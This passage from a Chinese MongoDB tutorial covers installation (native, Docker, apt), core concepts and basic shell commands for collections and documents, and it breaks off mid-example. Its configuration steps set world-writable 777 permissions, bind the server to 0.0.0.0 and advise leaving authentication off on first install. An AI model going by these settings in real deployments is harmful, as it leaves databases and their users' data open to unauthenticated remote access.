发布推出ACID事务支持，成为第一个支持强事务的NoSQL数据库；</li><li>2018年–至今，MongoDB已经从一个在数据库领域籍籍无名的“小透明”，变成了话题度和热度都很高的“流量”数据库。</li></ul><h3 id="1-3-特点">1.3 特点</h3><ul><li>面向集合存储，易存储对象类型的数据</li><li>支持查询以及动态查询</li><li>支持RUBY，PYTHON，JAVA，C++，PHP，C#等多种语言</li><li>文件存储格式为BSON（一种JSON的扩展）</li><li>支持复制和故障恢复和分片</li><li>支持事务支持（要求性不高，不能完全取代关系型数据库）</li><li>索引、聚合、关联</li></ul><h3 id="1-4-应用场景">1.4 应用场景</h3><ul><li><strong>游戏应用</strong>：使用云数据库MongoDB作为游戏服务器的数据库存储用户信息。用户的游戏装备、积分等直接以内嵌文档的形式存储，方便进行查询与更新</li><li><strong>物流应用</strong>：使用云数据库MongoDB存储订单信息，订单状态在运送过程中会不断更新，以云数据库MongoDB内嵌数组的形式来存储，一次查询就能将订单所有的变更读取出来，方便快捷且一目了然</li><li><strong>社交应用</strong>：使用云数据库MongoDB存储用户信息以及用户发表的朋友圈信息，通过地理位置索引实现附近的人、地点等功能。并且，云数据库MongoDB非常适合用来存储聊天记录，因为它提供了非常丰富的查询，并在写入和读取方面都相对较快</li><li><strong>视频直播</strong>：使用云数据库MongoDB存储用户信息、礼物信息等。</li><li><strong>大数据应用</strong>：使用云数据库MongoDB作为大数据的云存储系统，随时进行数据提取分析，掌握行业动态</li></ul><h2 id="2、MongoDB安装">2、MongoDB安装</h2><h3 id="2-1-原生安装">2.1 原生安装</h3><blockquote><p><a href="https://www.mongodb.com/try/download/community" target="_blank" rel="noopener" title="https://www.mongodb.com/try/download/community">https://www.mongodb.com/try/download/community</a></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">wget https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-ubuntu2004-5.0.19.tgz</span><br><span class="line"><span class="comment"># 解压缩</span></span><br><span class="line">tar -zxf mongodb-linux-x86_64-ubuntu2004-5.0.19.tgz</span><br><span class="line">mv mongodb-linux-x86_64-ubuntu2004-5.0.19 mongodb</span><br><span class="line"><span class="built_in">cd</span> mongodb/bin</span><br><span class="line"><span class="comment"># bin目录用来存放启动mongoDB的服务以及客户端链接的脚本文件等</span></span><br><span class="line"><span class="comment"># 启动 MongoDB 服务</span></span><br><span class="line"><span class="comment"># --port 指定服务监听端口号 默认为 27017</span></span><br><span class="line"><span class="comment"># --dbpath 指定 mongodb 数据存放目录 启动要求目录必须存在</span></span><br><span class="line"><span class="comment"># --logpath 指定 mongodb 日志文件存放位置</span></span><br><span class="line">./mongod --port=27017 --dbpath=../data --bind_ip=0.0.0.0 --logpath=../logs/mongo.log</span><br><span class="line"><span class="comment"># 5.x后需要确保cpu支持向量指令集，grep avx /proc/cpuinfo</span></span><br><span class="line"><span class="comment"># 客户端连接</span></span><br><span class="line">./mongo --port=27017</span><br></pre></td></tr></table></figure><p>下面是5.0.5版本和4.4.10版本配置文件启动，可以进行参考，机器环境为centos</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ======================5.05===========================</span></span><br><span class="line"><span class="comment">## 下载</span></span><br><span class="line">wget https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-rhel80-5.0.5.tgz</span><br><span class="line"></span><br><span class="line"><span class="comment">## 解压</span></span><br><span class="line">tar -zxvf mongodb-linux-x86_64-rhel80-5.0.5.tgz</span><br><span class="line"></span><br><span class="line"><span class="comment">## 重命名</span></span><br><span class="line">mv mongodb-linux-x86_64-rhel80-5.0.5 mongodb5.0.5</span><br><span class="line"></span><br><span class="line"><span class="comment">## 进入mongodb</span></span><br><span class="line"><span class="built_in">cd</span> mongodb5.0.5</span><br><span class="line"></span><br><span class="line"><span class="comment">## 修改数据日志文件路径</span></span><br><span class="line">mkdir -p /opt/home/mongodb5.0.5/data</span><br><span class="line">mkdir -p /opt/home/mongodb5.0.5/<span class="built_in">log</span></span><br><span class="line">touch /opt/home/mongodb5.0.5/<span class="built_in">log</span>/mongod.log</span><br><span class="line"></span><br><span class="line"><span class="comment">## 设置权限</span></span><br><span class="line">chmod -R 777 /opt/home/mongodb5.0.5/data</span><br><span class="line">chmod -R 777 /opt/home/mongodb5.0.5/<span class="built_in">log</span></span><br><span class="line">chmod -R 777 /opt/home/mongodb5.0.5/<span class="built_in">log</span>/mongod.log</span><br><span class="line"></span><br><span class="line"><span class="comment">## 进入mongodb安装的bin目录下</span></span><br><span class="line"><span class="built_in">cd</span> /opt/home/mongodb5.0.5/bin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 创建mongodb.conf文件</span></span><br><span class="line">vim mongodb.conf</span><br><span class="line"></span><br><span class="line"><span class="comment">## 添加下面的文件</span></span><br><span class="line"><span class="comment">#数据文件存放目录</span></span><br><span class="line">dbpath = /opt/home/mongodb5.0.5/data</span><br><span class="line"><span class="comment">#日志文件存放地址</span></span><br><span class="line">logpath =/opt/home/mongodb5.0.5/<span class="built_in">log</span>/mongod.log</span><br><span class="line"><span class="comment">#端口</span></span><br><span class="line">port = 27017 </span><br><span class="line"><span class="comment">#以守护程序的方式启用，即在后台运行</span></span><br><span class="line">fork = <span class="literal">true</span> </span><br><span class="line"><span class="comment">#需要认证。如果放开注释，就必须创建MongoDB的账号，使用账号与密码才可&gt;远程访问，第一次安装建议注释</span></span><br><span class="line"><span class="comment">#auth=true </span></span><br><span class="line"><span class="comment">#允许远程访问，或者直接注释，127.0.0.1是只允许本地访问</span></span><br><span class="line">bind_ip=0.0.0.0 </span><br><span class="line"></span><br><span class="line"><span class="comment">## 配置环境变量</span></span><br><span class="line">vim /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="comment">## mongodb</span></span><br><span class="line"><span class="built_in">export</span> PATH=/opt/home/mongodb5.0.5/bin:<span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 使配置文件生效</span></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="comment">## 启动</span></span><br><span class="line">./mongod --config ./mongodb.conf</span><br><span class="line"></span><br><span class="line"><span class="comment">## 测试</span></span><br><span class="line">./mongo</span><br><span class="line">&gt; 1+2</span><br><span class="line">3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ============================4.4.10版本=============================</span></span><br><span class="line"><span class="comment">## 下载</span></span><br><span class="line">wget https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-rhel80-4.4.10.tgz</span><br><span class="line"></span><br><span class="line"><span class="comment">## 解压</span></span><br><span class="line">tar -zxvf mongodb-linux-x86_64-rhel80-4.4.10.tgz</span><br><span class="line"></span><br><span class="line"><span class="comment">## 重命名</span></span><br><span class="line">mv mongodb-linux-x86_64-rhel80-4.4.10 mongodb4.4.10</span><br><span class="line"></span><br><span class="line"><span class="comment">## 配置环境变量</span></span><br><span class="line">vim /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="comment"># mongodb</span></span><br><span class="line"><span class="built_in">export</span> PATH=/opt/home/mongodb4.4.10/bin:<span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 使配置文件生效</span></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="comment">## 修改数据日志文件路径</span></span><br><span class="line">mkdir -p /opt/home/mongodb4.4.10/data</span><br><span class="line">mkdir -p /opt/home/mongodb4.4.10/<span class="built_in">log</span></span><br><span class="line">touch /opt/home/mongodb4.4.10/<span class="built_in">log</span>/mongod.log</span><br><span class="line"></span><br><span class="line"><span class="comment">## 设置权限</span></span><br><span class="line">chmod -R 777 /opt/home/mongodb4.4.10/data</span><br><span class="line">chmod -R 777 /opt/home/mongodb4.4.10/<span class="built_in">log</span></span><br><span class="line">chmod -R 777 /opt/home/mongodb4.4.10/<span class="built_in">log</span>/mongod.log</span><br><span class="line"></span><br><span class="line"><span class="comment">## 进入mongodb安装的bin目录下</span></span><br><span class="line"><span class="built_in">cd</span> /opt/home/mongodb4.4.10/bin</span><br><span class="line"></span><br><span class="line"><span class="comment">## 创建mongodb.conf文件</span></span><br><span class="line">vim mongodb.conf</span><br><span class="line"></span><br><span class="line"><span class="comment">#数据文件存放目录</span></span><br><span class="line">dbpath = /opt/home/mongodb4.4.10/data</span><br><span class="line"><span class="comment">#日志文件存放地址</span></span><br><span class="line">logpath =/opt/home/mongodb4.4.10/<span class="built_in">log</span>/mongod.log</span><br><span class="line"><span class="comment">#端口</span></span><br><span class="line">port = 27017 </span><br><span class="line"><span class="comment">#以守护程序的方式启用，即在后台运行</span></span><br><span class="line">fork = <span class="literal">true</span> </span><br><span class="line"><span class="comment">#需要认证。如果放开注释，就必须创建MongoDB的账号，使用账号与密码才可&gt;远程访问，第一次安装建议注释</span></span><br><span class="line"><span class="comment">#auth=true </span></span><br><span class="line"><span class="comment">#允许远程访问，或者直接注释，127.0.0.1是只允许本地访问</span></span><br><span class="line">bind_ip=0.0.0.0 </span><br><span class="line"></span><br><span class="line"><span class="comment">## 启动</span></span><br><span class="line">./mongod --config ./mongodb.conf</span><br></pre></td></tr></table></figure><h3 id="2-2-docker安装">2.2 docker安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker pull mongo:5.0.18</span><br><span class="line"><span class="comment"># 运行 mongo 镜像</span></span><br><span class="line">docker run -d --name mongo -p 27017:27017 mongo:5.0.18</span><br><span class="line">docker <span class="built_in">exec</span> -it mongo bash</span><br><span class="line"><span class="comment"># 连接</span></span><br><span class="line">mongo --port=27017</span><br></pre></td></tr></table></figure><h3 id="2-3-快捷安装">2.3 快捷安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装 MongoDB</span></span><br><span class="line">sudo apt-get install mongodb</span><br><span class="line"><span class="comment"># 查看版本号</span></span><br><span class="line">mongod -version</span><br><span class="line"><span class="comment"># 启动和关闭 MongoDB 服务</span></span><br><span class="line">service mongodb start</span><br><span class="line">service mongodb stop</span><br><span class="line"><span class="comment"># 查看 MongoDB 服务是否启动成功</span></span><br><span class="line">service mongodb status</span><br><span class="line">pgrep mongo -l</span><br><span class="line"><span class="comment"># 卸载 MongoDB</span></span><br><span class="line">sudo apt-get --purge remove mongodb mongodb-clients mongodb-server</span><br></pre></td></tr></table></figure><h1>二、核心概念</h1><h2 id="1、概述">1、概述</h2><p><strong>库&lt;DataBase&gt;</strong></p><p>mongodb中的库就类似于传统关系型数据库中库的概念，用来通过不同库隔离不同应用数据。   mongodb中可以建立多个数据库。每一个库都有自己的集合和权限，不同的数据库也放置在不同的文件中。默认的数据库为&quot;test&quot;，数据库存储在启动指定的data目录中。</p><p>**集合&lt;Collection&gt;**集合就是 MongoDB 文档组，类似于 RDBMS （关系数据库管理系统：Relational Database Management System)中的表的概念。集合存在于数据库中，一个库中可以创建多个集合。每个集合没有固定的结构，这意味着你在对集合可以插入不同格式和类型的数据，但通常情况下我们插入集合的数据都会有一定的关联性</p><p><strong>文档&lt;Document&gt;</strong></p><p>文档集合中一条条记录，是一组键值(key-value)对(即 BSON)。MongoDB 的文档不需要设置相同的字段，并且相同的字段不需要相同的数据类型，这与关系型数据库有很大的区别，也是 MongoDB 非常突出的特点。</p><table><thead><tr><th><strong>RDBMS</strong></th><th><strong>MongoDB</strong></th></tr></thead><tbody><tr><td>数据库&lt;database&gt;</td><td>数据库&lt;database&gt;</td></tr><tr><td>表&lt;table&gt;</td><td>集合&lt;collection&gt;</td></tr><tr><td>行&lt;row&gt;</td><td>文档&lt;document&gt;</td></tr><tr><td>列&lt;colume&gt;</td><td>字段&lt;field&gt;</td></tr></tbody></table><h2 id="2、数据库常用操作">2、数据库常用操作</h2><h3 id="2-1-库和集合操作">2.1 库和集合操作</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首先进入客户端</span></span><br><span class="line"><span class="comment"># 查看所有库，默认时test</span></span><br><span class="line">show databases; | show dbs;</span><br><span class="line"><span class="comment"># admin： 从权限的角度来看，这是"root"数据库。要是将一个用户添加到这个数据库，这个用户自动继承所有数据库的权限。一些特定的服务器端命令也只能从这个数据库运行，比如列出所有的数据库或者关闭服务器。</span></span><br><span class="line"><span class="comment"># local: 这个数据永远不会被复制，可以用来存储限于本地单台服务器的任意集合。</span></span><br><span class="line"><span class="comment"># config: 当Mongo用于分片设置时，config数据库在内部使用，用于保存分片的相关信息。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建数据库</span></span><br><span class="line"><span class="comment"># 注意: use 代表创建并使用,当库中没有数据时默认不显示这个库</span></span><br><span class="line">use 库名</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除数据库</span></span><br><span class="line"><span class="comment"># 默认删除当前选中的库</span></span><br><span class="line">db.dropDatabase() <span class="comment">#注意此处有括号</span></span><br><span class="line"><span class="comment"># 查看当前所在库</span></span><br><span class="line">db</span><br><span class="line"></span><br><span class="line"><span class="comment"># ======================集合===============</span></span><br><span class="line"><span class="comment"># 查看库中所有集合</span></span><br><span class="line">show collections; | show tables;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建集合</span></span><br><span class="line">db.createCollection(<span class="string">'集合名称'</span>, [options])</span><br><span class="line"><span class="comment"># options可以是如下参数</span></span><br><span class="line"><span class="comment"># capped  布尔  （可选）如果为 true，则创建固定集合。固定集合是指有着固定大小的集合，当达到最大值时，它会自动覆盖最早的文档。 当该值为 true 时，必须指定 size 参数</span></span><br><span class="line"><span class="comment"># size  数值  （可选）为固定集合指定一个最大值，即字节数。 如果 capped 为 true，也需要指定该字段</span></span><br><span class="line"><span class="comment"># max  数值  （可选）指定固定集合中包含文档的最大数量</span></span><br><span class="line"><span class="comment"># 注意:当集合不存在时,向集合中插入文档也会自动创建该集合</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除集合，如果成功删除选定集合，则 drop() 方法返回 true，否则返回 false</span></span><br><span class="line">db.集合名称.drop();</span><br></pre></td></tr></table></figure><h3 id="2-2-文档操作">2.2 文档操作</h3><blockquote><p><a href="https://www.mongodb.com/docs/manual/reference/method/" target="_blank" rel="noopener">https://www.mongodb.com/docs/manual/reference/method/</a></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ========================插入文档==================</span></span><br><span class="line"><span class="comment"># 单条文档</span></span><br><span class="line">db.集合名称.insert(document)</span><br><span class="line">db.users.insert(&#123;<span class="string">"name"</span>:<span class="string">"shawn"</span>,<span class="string">"age"</span>:23,<span class="string">"bir"</span>:<span class="string">"2012-12-12"</span>&#125;);</span><br><span class="line">db.users.insertOne(&#123;<span class="string">"name"</span>:<span class="string">"shawn"</span>,<span class="string">"age"</span>:23,<span class="string">"bir"</span>:<span class="string">"2012-12-12"</span>&#125;);</span><br><span class="line"><span class="comment"># 多条文档</span></span><br><span class="line">db.collection.insertMany()  <span class="comment"># 向指定集合中插入多条文档数据【推荐使用】</span></span><br><span class="line">db.集合名称.insertMany(</span><br><span class="line">    [ &lt;document 1&gt; , &lt;document 2&gt;, ... ],</span><br><span class="line">    &#123;</span><br><span class="line">       writeConcern: 1,//写入策略，默认为1，即要求确认写操作，0是不要求。</span><br><span class="line">       ordered: <span class="literal">true</span> //指定是否按顺序写入，默认<span class="literal">true</span>，按顺序写入。</span><br><span class="line">    &#125;</span><br><span class="line"> )</span><br><span class="line">db.users.insert([</span><br><span class="line">     &#123;<span class="string">"name"</span>:<span class="string">"shawn"</span>,<span class="string">"age"</span>:23,<span class="string">"bir"</span>:<span class="string">"2012-12-12"</span>&#125;,</span><br><span class="line">     &#123;<span class="string">"name"</span>:<span class="string">"小黑"</span>,<span class="string">"age"</span>:25,<span class="string">"bir"</span>:<span class="string">"2012-12-12"</span>&#125;</span><br><span class="line"> ]);</span><br><span class="line"><span class="comment"># 脚本方式</span></span><br><span class="line"><span class="keyword">for</span>(<span class="built_in">let</span> i=0;i&lt;100;i++)&#123;</span><br><span class="line">     db.users.insert(&#123;<span class="string">"_id"</span>:i,<span class="string">"name"</span>:<span class="string">"编程不良人_"</span>+i,<span class="string">"age"</span>:23&#125;);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment"># 注意:在mongodb中每个文档都会有一个_id作为唯一标识，_id默认会自动生成，如果手动指定将使用手动指定的值作为_id 的值</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ========================查询====================</span></span><br><span class="line"><span class="comment"># 查询所有</span></span><br><span class="line">db.集合名称.find();</span><br><span class="line"></span><br><span class="line"><span class="comment"># =====================删除文档===================</span></span><br><span class="line">db.集合名称.remove(</span><br><span class="line">  &lt;query&gt;,</span><br><span class="line">  &#123;</span><br><span class="line">    justOne: &lt;boolean&gt;,</span><br><span class="line">    writeConcern: &lt;document&gt;</span><br><span class="line">  &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">db.集合名称.deleteMany(&#123;query&#125;) <span class="comment">#不指定条件时删除集合下全部文档</span></span><br><span class="line"><span class="comment"># query :可选删除的文档的条件</span></span><br><span class="line"><span class="comment"># justOne : 可选如果设为 true 或 1，则只删除一个文档，如果不设置该参数，或使用默认值 false，则删除所有匹配条件的文档。</span></span><br><span class="line"><span class="comment"># writeConcern :可选抛出异常的级别。默认为writeConcern.NONE</span></span><br><span class="line">db.users.deleteMany(&#123;&#125;);</span><br><span class="line">db.users.deleteMany(&#123;age:23&#125;);</span><br><span class="line"><span class="comment"># 文档内容全部删除后，文档仍存在，即删除内容，不删除结构。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># =======================更新文档=======================</span></span><br><span class="line">db.集合名称.update(</span><br><span class="line">    &lt;query&gt;,</span><br><span class="line">    &lt;update&gt;,</span><br><span class="line">    &#123;</span><br><span class="line">      upsert: &lt;boolean&gt;,</span><br><span class="line">      multi: &lt;boolean&gt;,</span><br><span class="line">      writeConcern: &lt;document&gt;</span><br><span class="line">    &#125;</span><br><span class="line"> );</span><br><span class="line"><span class="comment"># 参数说明：</span></span><br><span class="line"><span class="comment"># query : update的查询条件，类似sql update查询内where后面的。</span></span><br><span class="line"><span class="comment"># update : update的对象和一些更新的操作符（如$,$inc...）等，也可以理解为sql update查询内set后面的</span></span><br><span class="line"><span class="comment"># upsert : 可选，这个参数的意思是，如果不存在update的记录，是否插入objNew,true为插入，默认是false，不插入。</span></span><br><span class="line"><span class="comment"># multi : 可选，mongodb 默认是false,只更新找到的第一条记录，如果这个参数为true,就把按条件查出来多条记录全部更新。</span></span><br><span class="line"><span class="comment"># writeConcern :可选，抛出异常的级别。</span></span><br><span class="line">  <span class="comment"># WriteConcern.NONE:没有异常抛出</span></span><br><span class="line">  <span class="comment"># WriteConcern.NORMAL:仅抛出网络错误异常，没有服务器错误异常</span></span><br><span class="line">  <span class="comment"># WriteConcern.SAFE:抛出网络错误异常、服务器错误异常；并等待服务器完成写操作。</span></span><br><span class="line">  <span class="comment"># WriteConcern.MAJORITY: 抛出网络错误异常、服务器错误异常；并等待一个主服务器完成写操作。</span></span><br><span class="line">  <span class="comment"># WriteConcern.FSYNC_SAFE: 抛出网络错误异常、服务器错误异常；写操作等待服务器将数据刷新到磁盘。</span></span><br><span class="line">  <span class="comment"># WriteConcern.JOURNAL_SAFE:抛出网络错误异常、服务器错误异常；写操作等待服务器提交到磁盘的日志文件。</span></span><br><span class="line">  <span class="comment"># WriteConcern.REPLICAS_SAFE:抛出网络错误异常、服务器错误异常；等待至少2台服务器完成写操作。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个更新是将符合条件的全部更新成后面的文档,相当于先删除在更新</span></span><br><span class="line">db.集合名称.update(&#123;<span class="string">"name"</span>:<span class="string">"zhangsan"</span>&#125;,&#123;name:<span class="string">"11"</span>,bir:new date()&#125;) </span><br><span class="line"><span class="comment"># 保留原来数据更新,但是只更新符合条件的第一条数据</span></span><br><span class="line">db.集合名称.update(&#123;<span class="string">"name"</span>:<span class="string">"xiaohei"</span>&#125;,&#123;<span class="variable">$set</span>:&#123;name:<span class="string">"mingming"</span>&#125;&#125;)</span><br><span class="line"><span class="comment"># 保留原来数据更新,更新符合条件的所有数据</span></span><br><span class="line">db.集合名称.update(&#123;name:”小黑”&#125;,&#123;<span class="variable">$set</span>:&#123;name:”小明”&#125;&#125;,&#123;multi:<span class="literal">true</span>&#125;)       </span><br><span class="line"><span class="comment"># 保留原来数据更新,更新符合条件的所有数据，没有条件符合时插入数据</span></span><br><span class="line">db.集合名称.update(&#123;name:”小黑”&#125;,&#123;<span class="variable">$set</span>:&#123;name:”小明”&#125;&#125;,&#123;multi:<span class="literal">true</span>,upsert:<span class="literal">true</span>&#125;)</span><br></pre></td></tr></table></figure><h3 id="2-3-文档查询">2.3 文档查询</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># MongoDB 查询文档使用 find() 方法。find() 方法以非结构化的方式来显示所有文档。</span></span><br><span class="line">db.集合名称.find(query, projection)</span><br><span class="line"><span class="comment"># query ：可选，使用查询操作符指定查询条件</span></span><br><span class="line"><span class="comment"># projection ：可选，使用投影操作符指定返回的键。查询时返回文档中所有键值， 只需省略该参数即可（默认省略）。</span></span><br><span class="line"><span class="comment"># 如果你需要以易读的方式来读取数据，可以使用 pretty() 方法，语法格式如下</span></span><br><span class="line">db.集合名称.find().pretty()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 条件运算符</span></span><br><span class="line">db.集合名.find(&#123;age:30&#125;); <span class="comment"># 查找 age=30 的数据</span></span><br><span class="line">db.集合名.find(&#123;age:&#123;<span class="variable">$lt</span>:30&#125;&#125;); <span class="comment"># 查找 age&lt;30 的数据</span></span><br><span class="line">db.集合名.find(&#123;age:&#123;<span class="variable">$lte</span>:30&#125;&#125;); <span class="comment"># 查找 age&lt;=30 的数据</span></span><br><span class="line">db.集合名.find(&#123;age:&#123;<span class="variable">$gt</span>:30&#125;&#125;); <span class="comment"># 查找 age&gt;30 的数据</span></span><br><span class="line">db.集合名.find(&#123;age:&#123;<span class="variable">$gte</span>:30&#125;&#125;); <span class="comment"># 查找 age&gt;=30 的数据</span></span><br><span class="line">db.集合名.find(&#123;age:&#123;<span class="variable">$ne</span>:30&#125;&#125;); <span class="comment"># 查找 age!=30 的数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># AND</span></span><br><span class="line">db.集合名称.find(&#123;key1:value1, key2:value2,...&#125;).pretty()</span><br><span class="line"><span class="comment"># 类似于 WHERE 语句：WHERE key1=value1 AND key2=value2</span></span><br><span class="line">db.users.find(&#123;<span class="string">"age"</span>:27,<span class="string">"name"</span>:<span class="string">"欧力给"</span>,_id:8&#125;);</span><br><span 